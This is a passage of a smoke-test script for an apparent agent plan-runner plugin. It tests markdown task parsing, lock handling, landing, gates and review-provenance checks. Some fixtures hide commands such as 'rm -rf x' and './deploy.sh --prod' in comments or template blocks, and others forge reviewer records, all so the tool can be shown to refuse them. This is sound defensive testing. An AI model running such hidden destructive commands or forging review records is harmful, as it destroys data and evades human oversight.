  "details-d1":("- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n\n<details><summary>Task template</summary>\n```\n\nCopy this block into the plan:\n```\n- [ ] **Phase 9.9** [docs] example task\n  - Acceptance: ./deploy.sh --prod\n```\n</details>\n```\n", None),
  "div":       (D + "<div>\n```\n" + EX + "```\n</div>\n\n" + T, None),
  "comment1":  (D + "<!-- note -->\n\n" + T, None),
  "comment2":  (D + "<!--\n" + EX + "-->\n\n" + T, None),
  "pre":       (D + "<pre>\n" + EX + "</pre>\n\n" + T, None),
  "indentdiv": (D + "  <div>\n\n```\n" + EX + "```\n\n" + T, None),
  "fence1":    (D + " ```\n" + EX + " ```\n\n" + T, None),
  "fence4":    (D + "    ```\n" + EX + "    ```\n\n" + T, None),
  "fenceblk":  (T + "  ```\n  example\n  ```\n", None),
  "blkcomment":("- [ ] **Phase 1.1** real\n  - <!--\n  - Acceptance: rm -rf x\n  -->\n", None),
  "blkcol0":   ("- [ ] **Phase 1.1** real\n# heading\n    - Acceptance: make real\n", None),
  "nbspclose": (D + "```\n" + EX + "``` \n\n" + T, None),
  "cr":        (D + "text\r- [ ] **Phase 9.9** hidden\n\n" + T, None),
  "nested":    (D + "- note\n    - [ ] x\n\n" + T, None),
  "dash2":     (D + "- - [ ] x\n\n" + T, None),
  "ordered":   (D + "1. [ ] x\n\n" + T, None),
  "innerfence":(D + "````\n```\n" + EX + "````\n\n" + T, None),
  "tabclose":  (D + "```\n" + EX + "\t```\n```\n\n" + T, None),
  "front":     ("---\ntitle: x\n---\n\n" + T, None),
  "math":      (D + "$$\nx\n$$\n\n" + T, None),
  "admon":     (D + ":::note\nx\n:::\n\n" + T, None),
  "emptymark": (D + "-\n  [ ] **Phase 2** hidden task\n\n" + T, None),
  "emptystar": (D + "*\n    [ ] t\n\n" + T, None),
  "emptyord":  (D + "1.\n   [ ] t\n\n" + T, None),
  "emptyx":    (D + "-\n  [x] t\n\n" + T, None),
  "hrthen":    (D + "***\n*\n  [ ] t\n\n" + T, None),
  "setext":    ("- [ ] **Phase 1.1** Ship it\n  ===\n  - Acceptance: true\n", None),
  "bom":       ("\ufeff" + T, None),
  "vt-before": (D + "- \v[ ] **Phase 2** vt\n\n" + T, None),
  "ff-after":  (D + "- [ ]\f**Phase 2** ff\n\n" + T, None),
  "nbsp":      (D + "- \u00a0[ ] **Phase 2** nbsp\n\n" + T, None),
  "ideosp":    (D + "-\n  \u3000[ ] **Phase 2** ideographic\n\n" + T, None),
  "emsp":      (D + "-\u2003[x] t\n\n" + T, None),
  "entity":    (D + "- &#91; ] t\n\n" + T, None),
  "escaped":   (D + "- \\[ ] t\n\n" + T, None),
  "h4-listcomment": ("- <!--\n" + T, None),
  "h5-quotecomment": ("> <!--\n" + T, None),
  "h1-midhidden":  ("Notes for reviewers <div hidden>\n\n" + T, None),
  "h2-midtextarea":("Example plan below <textarea>\n\n" + T, None),
  "autolink":      ("See <https://example.com>\n\n" + T, None),
  "ent-hexcap":    (D + "- &#X5B; ] t\n\n" + T, None),
  "ent-inside":    (D + "- [&#32;] t\n\n" + T, None),
  "ent-nbsp":      (D + "- [&nbsp;] t\n\n" + T, None),
  "ent-close":     (D + "- [ &#93; t\n\n" + T, None),
  # controls: these validate and run Phase 1.1
  "codespan":    (D + "Use `<repo-root>` in a code span.\n\n" + T, None),
  "bt-escaped":  ("Notes \\`<div hidden>\\`\n\n" + T, None),
  "bt-split1":   ("Notes ``<div hidden>`\n\n" + T, None),
  "bt-split2":   ("Notes `<div hidden>``\n\n" + T, None),
  "bt-split3":   ("Notes ``<div hidden>` x `\n\n" + T, None),
  "bt-infofence":("```x`<div hidden>\n\n" + T, None),
  "bt-listfence":("- ```x`<div hidden>\n\n" + T, None),
  "placeholder": (D + "Run {check} against {target}.\n\n" + T, "Phase 1.1"),
  "arrows":      (D + "Keep a <- b and x < y.\n\n" + T, "Phase 1.1"),
  "lessthan":    (D + "Keep p50 < 150 ms and 3 <= n.\n\n" + T, "Phase 1.1"),
  "quoted":    (D + "> ```\n> - [ ] **Phase 9** quoted example\n> ```\n\n" + T, "Phase 1.1"),
  "fenceok":   (D + "```\nmake real\n```\n\n" + T, "Phase 1.1"),
  "longfence": (D + "````md\nexample text\n````\n\n" + T, "Phase 1.1"),
  "midcomment":(D + "text <!-- inline\n\n" + T, None),
  "listfence": (D + "- ```\n  note\n\n" + T, "Phase 1.1"),
}
bad = []
for name, (text, want) in cases.items():
    p = os.path.join(tmp, f"dialect-{name}.md")
    open(p, "w", newline="").write(text)
    v = subprocess.run([sys.executable, pl, "validate", p], capture_output=True, text=True)
    n = json.loads(subprocess.run([sys.executable, pl, "next", p], capture_output=True, text=True).stdout)
    if want is None:
        if v.returncode == 0 or n["status"] != "ERROR":
            bad.append(f"{name}: expected refusal, validate rc={v.returncode} next={n['status']}")
    else:
        got = (n.get("task") or {}).get("id")
        if v.returncode != 0 or n["status"] != "READY" or got != want:
            bad.append(f"{name}: expected READY {want}, validate rc={v.returncode} {v.stdout.strip()[:120]} next={n['status']} {got}")
for b in bad:
    print("dialect:", b, file=sys.stderr)
sys.exit(1 if bad else 0)
PY
# The shipped templates and examples stay inside the dialect.
for t in "$EX/../resources/examples/sample-plan.md" "$EX/../resources/templates/dev-plan.md" "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/generic/plan-template.md" "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/apex/plan-template.md"; do
  python3 "$PL" validate "$t" >/dev/null 2>&1 || fail "shipped template no longer validates: $t"
done
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 9** example\n```\n' >"$SMOKE_TMP/rem.md"
if python3 "$PL" remaining "$SMOKE_TMP/rem.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with a fenced task line"; fi
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```\n- [ ] **Phase 1.2** b\n' >"$SMOKE_TMP/rem2.md"
if python3 "$PL" remaining "$SMOKE_TMP/rem2.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with an unclosed fence"; fi
printf -- '- [ ] **Phase 1.1** caf\351 latin-1\n  - Acceptance: true\n' >"$SMOKE_TMP/latin1.md"
[ "$(python3 "$PL" counts "$SMOKE_TMP/latin1.md")" = "1 0" ] || fail "planlib could not count a Latin-1 plan"
ok "planlib: tags, directives, Blocked-by, next-unblocked, lanes, validation; nothing hidden, ambiguity refused"

# 26. iterate.sh: ACTIVE lock (a second plan is BUSY), STAGE and directive fields
#     in the brief, ROUTE: none without apex-dispatch, BLOCKED when nothing is ready.
K="$SMOKE_TMP/lockrepo"; mkdir -p "$K/plans"; git init -q -b main "$K"
# A valid copy of the check-25 plan (its Phase 1.5 names an unknown gate on purpose).
sed '/Phase 1.5/,$d' "$P25" >"$K/plans/a-plan.md"; cp "$K/plans/a-plan.md" "$K/plans/b-plan.md"; git -C "$K" add -A; git -C "$K" commit -qm k
( cd "$K" && APEX_GIBSON=0 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 && APEX_GIBSON=0 "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "init for the lock test failed"
OUT_A="$(APEX_DISPATCH_MODE= brief "$K" plans/a-plan.md)"
# With the sibling apex-dispatch installed (this marketplace ships it), the
# brief carries its ROUTE block; APEX_DISPATCH_MODE=off is the 0.2.0 brief.
DISPATCH_SIBLING="$(source "$EX/_lib.sh" && apex_dispatch_root)"
if [ -n "$DISPATCH_SIBLING" ]; then ROUTE_WANT="^ROUTE_STATUS: READY"; else ROUTE_WANT="^ROUTE: none"; fi
for want in "^STATUS: READY" "^STAGE: BUILD" "^ROUTE_DIRECTIVE: class=tests" "^PATHS: tests/a/\*\*" "^BUDGET: usd=2" "^LANES: " "$ROUTE_WANT"; do
  has "$want" "$OUT_A" || fail "iterate brief lacks $want"
done
has "^ROUTE: none" "$(APEX_DISPATCH_MODE=off brief "$K" plans/a-plan.md)" || fail "APEX_DISPATCH_MODE=off did not give ROUTE: none"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "a second plan was not BUSY while the first holds the ACTIVE lock"
has '^STATUS: READY' "$(brief "$K" plans/a-plan.md)" || fail "the lock owner could not re-acquire"
has '^STATUS: READY' "$(APEX_FORCE_UNLOCK=1 brief "$K" plans/b-plan.md)" || fail "APEX_FORCE_UNLOCK did not reclaim the lock"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Blocked-by: phase-1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: phase-1.1\n' >"$K/plans/c-plan.md"
( cd "$K" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init c-plan failed"
# Everything blocked needs a cycle or an unknown reference: both make the plan
# invalid, and an invalid plan is never iterated.
C_OUT="$(APEX_FORCE_UNLOCK=1 brief "$K" plans/c-plan.md)"
has '^PLAN_ERROR: Blocked-by cycle' "$C_OUT" && has '^STATUS: ERROR plan is invalid' "$C_OUT" \
  || fail "a cyclic plan was not refused as invalid"
for p in a b; do has '^__RC__: 0$' "$(brief "$K" plans/$p-plan.md)" || fail "iterate.sh exited non-zero for plans/$p-plan.md"; done
LOCKD="$(cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/a-plan.md && printf '%s' "$STATE_BASE")/ACTIVE"
rm -rf "$LOCKD"; mkdir -p "$LOCKD"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "a lock dir without owner.json was treated as free"
for i in 1 2 3 4 5 6 7 8 9 10; do
  rm -rf "$LOCKD"
  ( brief "$K" plans/a-plan.md >"$SMOKE_TMP/ra" & brief "$K" plans/b-plan.md >"$SMOKE_TMP/rb" & wait )
  n="$(cat "$SMOKE_TMP/ra" "$SMOKE_TMP/rb" | grep -c '^STATUS: READY' || true)"
  [ "$n" = 1 ] || fail "lock race $i: $n plans got STATUS: READY"
done
rm -rf "$LOCKD"; mkdir -p "$LOCKD"; echo null >"$LOCKD/owner.json"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "an owner.json of null was treated as free"
rm -rf "$LOCKD"; brief "$K" plans/a-plan.md >/dev/null
B_ID="$(cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/b-plan.md && printf '%s' "$PLAN_HASH")"
( cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/a-plan.md && apex_lock_stage "$B_ID" DONE )
grep -q '"stage": "BUILD"' "$LOCKD/owner.json" || fail "a non-owner changed the lock's stage"
rm -rf "$LOCKD"; mkdir -p "$LOCKD.lockdir-test"; LOCKF="$(dirname "$LOCKD")/.active.lock"; rm -f "$LOCKF"; mkdir "$LOCKF"
has '^STATUS: ERROR the ACTIVE lock could not be' "$(brief "$K" plans/a-plan.md)" || fail "an unusable lock file was reported as BUSY"
rmdir "$LOCKF" "$LOCKD.lockdir-test"
# Session-scoped (spec §5.3 D): the same plan from another session is BUSY.
rm -rf "$LOCKD"
has '^STATUS: READY' "$(CLAUDE_CODE_SESSION_ID=sessA brief "$K" plans/a-plan.md)" || fail "session A could not take the lock"
has '^STATUS: BUSY' "$(CLAUDE_CODE_SESSION_ID=sessB brief "$K" plans/a-plan.md)" || fail "a second session took over the same plan's lock"
has '^STATUS: READY' "$(CLAUDE_CODE_SESSION_ID=sessA brief "$K" plans/a-plan.md)" || fail "session A could not re-acquire its own lock"
has '^STATUS: BUSY' "$(CLAUDE_CODE_SESSION_ID= brief "$K" plans/a-plan.md)" || fail "a caller without a session id took over a session's lock"
ok "iterate: ACTIVE lock (atomic, fail-closed, owner- and session-checked), brief fields, ROUTE block (or ROUTE: none), invalid plans refused"

# 27. land.sh handles a plan path that git quotes (spaces).
Q="$SMOKE_TMP/quoted repo"; mkdir -p "$Q/my plans"; git init -q -b main "$Q"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$Q/my plans/q-plan.md"; git -C "$Q" add -A; git -C "$Q" commit -qm q
( cd "$Q" && APEX_GIBSON=0 "$EX/init.sh" "my plans/q-plan.md" >/dev/null 2>&1 ) || fail "init with a spaced plan path failed"
sed -i.bak 's/^- \[ \]/- [x]/' "$Q/my plans/q-plan.md" && rm -f "$Q/my plans/q-plan.md.bak"
( cd "$Q" && APEX_GIBSON=0 "$EX/land.sh" "my plans/q-plan.md" >/dev/null 2>&1 ) || fail "land.sh refused a plan path containing spaces"
# A rename into the ledger path, or an APEX_LESSONS_FILE pointing at a source
# file, never lets an unrelated change ride along.
G="$SMOKE_TMP/g27"; mkdir -p "$G/plans" "$G/src"; git init -q -b main "$G"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$G/plans/g-plan.md"; echo s >"$G/src/secret.txt"; echo a >"$G/src/app.py"
git -C "$G" add -A; git -C "$G" commit -qm g
( cd "$G" && APEX_GIBSON=0 "$EX/init.sh" plans/g-plan.md >/dev/null 2>&1 ) || fail "init g27 failed"
sed -i.bak 's/^- \[ \]/- [x]/' "$G/plans/g-plan.md" && rm -f "$G/plans/g-plan.md.bak"
mkdir -p "$G/.claude/apex-scope-loop"; git -C "$G" mv src/secret.txt .claude/apex-scope-loop/LESSONS.md
expect_refusal "rename into the ledger" "unrelated to this plan" indir "$G" APEX_GIBSON=0 "$EX/land.sh" plans/g-plan.md
git -C "$G" mv .claude/apex-scope-loop/LESSONS.md src/secret.txt; echo edit >>"$G/src/app.py"
expect_refusal "APEX_LESSONS_FILE exemption" "unrelated to this plan" indir "$G" APEX_GIBSON=0 APEX_LESSONS_FILE="$G/src/app.py" "$EX/land.sh" plans/g-plan.md
# land.sh and iterate.sh share one definition of done and one validity gate:
# a plan iterate refuses (here a duplicate id, which parses cleanly) never
# lands, --force included, and land says so itself.
FE="$SMOKE_TMP/fenced"; mkdir -p "$FE/plans"; git init -q -b main "$FE"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"; git -C "$FE" add -A; git -C "$FE" commit -qm f
( cd "$FE" && APEX_GIBSON=0 "$EX/init.sh" plans/f-plan.md >/dev/null 2>&1 ) || fail "init for the invalid-plan land test failed"
printf -- '- [x] **Phase 1.1** [docs] x\n  - Acceptance: true\n- [x] **Phase 1.1** [docs] duplicate id\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"
has '^STATUS: ERROR plan is invalid' "$(brief "$FE" plans/f-plan.md)" || fail "iterate did not refuse the duplicate-id plan"
expect_refusal "land an invalid plan" "refusing to land" indir "$FE" APEX_GIBSON=0 "$EX/land.sh" plans/f-plan.md --force
ok "land.sh: quoted plan paths; no exemption by rename or APEX_LESSONS_FILE; done means what iterate means"

# 28. One lessons ledger per repository: base caller, worktree caller and a
#     bare repo's worktrees all read and write the same file.
LP="$R/.claude/plans/demo-plan.md"
( cd "$R" && "$EX/lessons.sh" .claude/plans/demo-plan.md add "smoke lesson" w r f smoketag >/dev/null ) || fail "lessons add from the base checkout failed"
has '^LESSONS: 1 ' "$(cd "$WTP" && "$EX/lessons.sh" "$WTP/.claude/plans/demo-plan.md" recall smoketag)" || fail "the plan worktree does not see the base checkout's lesson"
BR="$SMOKE_TMP/bare.git"; git init -q --bare -b main "$BR"
git -C "$BR" worktree add -q "$SMOKE_TMP/bw1" -b w1 2>/dev/null || git -C "$BR" worktree add -q "$SMOKE_TMP/bw1" --orphan w1
mkdir -p "$SMOKE_TMP/bw1/plans"; cp "$P25" "$SMOKE_TMP/bw1/plans/x-plan.md"; git -C "$SMOKE_TMP/bw1" add -A; git -C "$SMOKE_TMP/bw1" commit -qm x
git -C "$BR" worktree add -q "$SMOKE_TMP/bw2" -b w2 w1
L1="$(cd "$SMOKE_TMP/bw1" && source "$EX/_lib.sh" && apex_resolve plans/x-plan.md && printf '%s' "$LESSONS_LEDGER")"
L2="$(cd "$SMOKE_TMP/bw2" && source "$EX/_lib.sh" && apex_resolve plans/x-plan.md && printf '%s' "$LESSONS_LEDGER")"
[ -n "$L1" ] && [ "$L1" = "$L2" ] || fail "bare-repo worktrees use different lesson ledgers: $L1 vs $L2"
ok "one lessons ledger per repository"

# 29. promote-to-loop validates with planlib (dialect, directives, cycles)
#     before touching state; a valid plan still promotes.
PR="$SMOKE_TMP/promote29"; mkdir -p "$PR/.claude/tasks" "$PR/.claude/plans"; git init -q -b main "$PR"
printf '# ADR\n**Status**: Accepted\n' >"$PR/.claude/tasks/p-adr.md"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  + Budget: usd=0.5\n' >"$PR/.claude/plans/p-plan.md"
git -C "$PR" add -A; git -C "$PR" commit -qm p
expect_refusal "promote a plan with a non-canonical directive" "directive not in the form" indir "$PR" APEX_GIBSON=0 "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" p
[ ! -d "$PR/.dev-plan-state" ] || fail "promote created state for an invalid plan"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: Phase 1.1\n' >"$PR/.claude/plans/p-plan.md"
expect_refusal "promote a cyclic plan" "Blocked-by cycle" indir "$PR" APEX_GIBSON=0 "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" p
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n- [ ] **Gate 1→2** [gate:human] approve\n  - Acceptance: user types approve gate-1-2\n' >"$PR/.claude/plans/p-plan.md"
if [ -n "$DISPATCH_SIBLING" ]; then ROUTE_DRY="Route dry-run: every unchecked task routes"; else ROUTE_DRY="Route dry-run: skipped"; fi
has "$ROUTE_DRY" "$(cd "$PR" && APEX_DISPATCH_MODE= APEX_GIBSON=0 "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" p 2>&1)" || fail "a valid plan did not promote"
ok "promote-to-loop: planlib validation, cycles, gate semantics, route dry-run seam"

export GG_SH="$EX/green-gate.sh"
# 30. green-gate autodetects non-npm toolchains (a real stop signal outside npm).
GG="$SMOKE_TMP/gg30"; mkdir -p "$GG/plans"; git init -q -b main "$GG"
printf 'test:\n\t@test -f ok.txt\nlint:\n\t@true\n' >"$GG/Makefile"; touch "$GG/ok.txt"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$GG/plans/g-plan.md"; git -C "$GG" add -A; git -C "$GG" commit -qm g
G_OUT="$( (cd "$GG" && "$EX/init.sh" plans/g-plan.md) 2>&1 || true)"
has "GATE_STEP: test PASS" "$G_OUT" || fail "green-gate did not pick up the Makefile test target"
G_WT="$(st "$GG" plans/g-plan.md)/worktree"
git -C "$G_WT" rm -q ok.txt && git -C "$G_WT" commit -qm break
has "GATE_STEP: test NEW_FAILURE" "$( (cd "$GG" && "$EX/green-gate.sh" plans/g-plan.md check) 2>&1 || true)" || fail "green-gate missed a new failure in an autodetected step"
PY30="$SMOKE_TMP/py30"; mkdir -p "$PY30/tests"; printf '[project]\nname="x"\n[tool.ruff]\n' >"$PY30/pyproject.toml"
python3 - "$PY30" <<'PY' || fail "green-gate Python autodetect"
import os, subprocess, sys
wt = sys.argv[1]
src = open(os.environ["GG_SH"]).read()
block = src[src.index("python3 - \"$WT\" \"$step\" <<'PY'") + len("python3 - \"$WT\" \"$step\" <<'PY'\n"):]
block = block[:block.index("\nPY\n")]
got = {s: subprocess.run([sys.executable, "-c", block, wt, s], capture_output=True, text=True).stdout for s in ("test", "lint", "typecheck")}
assert got["test"].endswith("pytest -q") and got["lint"].endswith("ruff check .") and got["typecheck"] == "", got
PY
ok "green-gate: Makefile and Python toolchains autodetected"

# 31. gate.sh partner gates: APEX_PARTNER_NOTIFY_CMD gets the gate JSON; with
#     no channel the gate degrades to a human gate (exit 2), never exit 4.
GP="$SMOKE_TMP/gp31"; mkdir -p "$GP/plans"; git init -q -b main "$GP"
printf -- '- [ ] **Gate 1→2** [gate:partner:x@y.com] partner approval\n  - Acceptance: partner approves in inbox\n' >"$GP/plans/g-plan.md"
GS="$PLUGIN_ROOT/skills/apex-plan/scripts/gate.sh"
rc=0; out="$(cd "$GP" && APEX_PARTNER_NOTIFY_CMD="cat >'$SMOKE_TMP/notified.json'" "$GS" plans/g-plan.md gate-1-2 2>&1)" || rc=$?
[ "$rc" = 2 ] && python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["forUser"]=="x@y.com"' "$SMOKE_TMP/notified.json" || fail "partner notify command did not receive the gate (rc=$rc)"
rc=0; out="$(cd "$GP" && "$GS" plans/g-plan.md gate-1-2 2>&1)" || rc=$?
[ "$rc" = 2 ] && has "treating as \[gate:human\]" "$out" || fail "a partner gate with no channel did not degrade to a human gate (rc=$rc)"
ok "gate.sh: partner notifier, human-gate fallback"

# 32. checkpoint review: full SHAs only; a hard cap of 3 rounds per attempt;
#     fail starts a new attempt; Tier C needs an adversarial APPROVE; complete
#     only flips an unchecked task; rewind of an unchecked line changes no count.
CK="$SMOKE_TMP/ck32"; mkdir -p "$CK/plans"; git init -q -b main "$CK"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n\nprose line\n' >"$CK/plans/c-plan.md"; git -C "$CK" add -A; git -C "$CK" commit -qm c
( cd "$CK" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init for the checkpoint test failed"
CP="$EX/checkpoint.sh"; CWT="$(st "$CK" plans/c-plan.md)/worktree"
sha() { git -C "$CWT" rev-parse HEAD; }
expect_refusal "short review SHA" "not a full commit SHA" indir "$CK" "$CP" plans/c-plan.md review 1 abc123 APPROVE
for i in 1 2 3; do git -C "$CWT" commit -q --allow-empty -m "r$i"; (cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES >/dev/null) || fail "review round $i was refused"; done
git -C "$CWT" commit -q --allow-empty -m r4
expect_refusal "a fourth review round" "REVIEW_CAP" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE
(cd "$CK" && "$CP" plans/c-plan.md fail 1 "cap reached" >/dev/null)
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE >/dev/null) || fail "a new attempt after fail could not be reviewed"
(cd "$CK" && "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1) || true
python3 - "$(st "$CK" plans/c-plan.md)/checkpoint.json" "$(sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {})["1"] = {"tier": "C", "head": h}; json.dump(s, open(p, "w"))
PY
(cd "$CK" && "$CP" plans/c-plan.md approve 1 "$(sha)" "approve G12 1" >/dev/null)
expect_refusal "Tier C without an adversarial review" "adversarial review" indir "$CK" "$CP" plans/c-plan.md complete 1 ok
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE --role adversarial >/dev/null) || fail "adversarial review not recorded"
(cd "$CK" && "$CP" plans/c-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete refused a fully reviewed, approved Tier C head"
expect_refusal "complete on a checked line" "already checked" indir "$CK" "$CP" plans/c-plan.md complete 1 ok
expect_refusal "complete on prose" "not a task" indir "$CK" "$CP" plans/c-plan.md complete 4 ok
expect_refusal "rewind on prose" "not a task" indir "$CK" "$CP" plans/c-plan.md rewind 4
done_n() { python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["completed_tasks"])' "$(st "$1" "$2")/checkpoint.json"; }
C0="$(done_n "$CK" plans/c-plan.md)"
(cd "$CK" && "$CP" plans/c-plan.md rewind 1 >/dev/null) || fail "rewind of a checked task failed"
(cd "$CK" && "$CP" plans/c-plan.md rewind 1 >/dev/null) || fail "rewind of an unchecked task failed"
C1="$(done_n "$CK" plans/c-plan.md)"
[ "$C1" = "$((C0 - 1))" ] && grep -q '^- \[ \] \*\*Phase 1.1' "$CK/plans/c-plan.md" || fail "rewind did not uncheck once and decrement once ($C0 -> $C1)"
ok "checkpoint: SHA form, round cap, attempts, Tier C adversarial, complete/rewind targets"

# 33. Provenance (spec §5.3 G): with dispatch state, a typed verdict is refused;
#     a reviews-raw record with the same verdict at the same SHA is accepted.
CKS="$(st "$CK" plans/c-plan.md)"; mkdir -p "$CKS/dispatch/reviews-raw"
git -C "$CWT" commit -q --allow-empty -m p1
expect_refusal "typed verdict with dispatch state" "needs provenance" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "record_id": "run-0000"}' "$(sha)" >"$CKS/dispatch/reviews-raw/ag0.json"
expect_refusal "a record that names no task line" "must name their task line" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag0
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "line": 1}' "$(sha)" >"$CKS/dispatch/reviews-raw/agN.json"
expect_refusal "a record without a record_id" "no record_id" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id agN
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "line": 1, "record_id": "run-0001"}' "$(sha)" >"$CKS/dispatch/reviews-raw/ag1.json"
expect_refusal "verdict that contradicts its record" "says REQUEST_CHANGES" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --agent-id ag1
expect_refusal "default reviewer name with dispatch state" "name the reviewer" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES --agent-id ag1
expect_refusal "role relabelled against its record" "does not match" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1 --role adversarial
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1 >/dev/null) || fail "a verdict matching its reviews-raw record was refused"
expect_refusal "a provenance record used twice" "already recorded" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1
ln "$CKS/dispatch/reviews-raw/ag1.json" "$CKS/dispatch/reviews-raw/ag1b.json"
printf '{ "record_id": "run-0001", "line": 1, "role": "reviewer", "verdict": "REQUEST_CHANGES", "head_sha": "%s" }\n' "$(sha)" >"$CKS/dispatch/reviews-raw/ag1c.json"
expect_refusal "a provenance record re-serialised under another name" "already recorded" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1c
expect_refusal "a provenance record reused through a hard link" "already recorded" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1b
expect_refusal "path-like agent id" "unexpected characters" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --agent-id ../x
mkdir -p "$SMOKE_TMP/forged"; printf '{"head_sha": "%s", "verdict": "APPROVE", "role": "adversarial", "line": 1, "record_id": "run-w0001"}' "$(sha)" >"$SMOKE_TMP/forged/result.json"
expect_refusal "a worker result outside the shim directories" "not a shim worker directory" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$SMOKE_TMP/forged"
mkdir -p "$CKS/dispatch/workers/w1/deep"; cp "$SMOKE_TMP/forged/result.json" "$CKS/dispatch/workers/w1/"; cp "$SMOKE_TMP/forged/result.json" "$CKS/dispatch/workers/w1/deep/"
expect_refusal "a worker result nested below a worker directory" "not a shim worker directory" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1/deep"
# A shim result (apex-dispatch bin/worker-*.sh) must say source shim, name a provider other than
# claude-session, have finished cleanly, and have a shim verdict row with its record_id in the ledger.
expect_refusal "a worker result that is not a shim result" "not a provider shim result" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1"
python3 -c 'import json,sys; p=sys.argv[1]; r=json.load(open(p)); r.update(source="shim", provider="codex", exit_code=0, sentinel_seen=True); json.dump(r, open(p, "w"))' "$CKS/dispatch/workers/w1/result.json"
expect_refusal "a shim result without its ledger verdict row" "no shim verdict row" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1"
if [ -f "$PLUGIN_ROOT/../apex-dispatch/scripts/lib/ledger.py" ]; then
  python3 - "$PLUGIN_ROOT/../apex-dispatch/scripts/lib" "$CKS" "$(sha)" <<'PY' || fail "could not write the shim verdict row"
import sys
sys.path.insert(0, sys.argv[1]); import ledger
ledger.append(sys.argv[2], "verdict", {"role": "adversarial", "verdict": "APPROVE", "record_id": "run-w0001", "line": 1, "provider": "codex"},
              "shim", route_id="r-w1", head_sha=sys.argv[3])
PY
else
  printf '{"event": "verdict", "source": "shim", "record_id": "run-w0001", "verdict": "APPROVE", "head_sha": "%s"}\n' "$(sha)" >>"$CKS/dispatch/ledger.jsonl"
fi
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1" >/dev/null) || fail "a worker result inside the dispatch state was refused"
python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))["reviews"]["1"]["records"][-1]; assert r["role"]=="adversarial" and r["provenance"]=="worker" and r["provider"]=="codex", r' "$CKS/checkpoint.json" || fail "the role and provider were not taken from the worker record"
expect_refusal "--skip-review with dispatch state" "skip-review is not accepted" indir "$CK" "$CP" plans/c-plan.md complete 1 ok --skip-review why
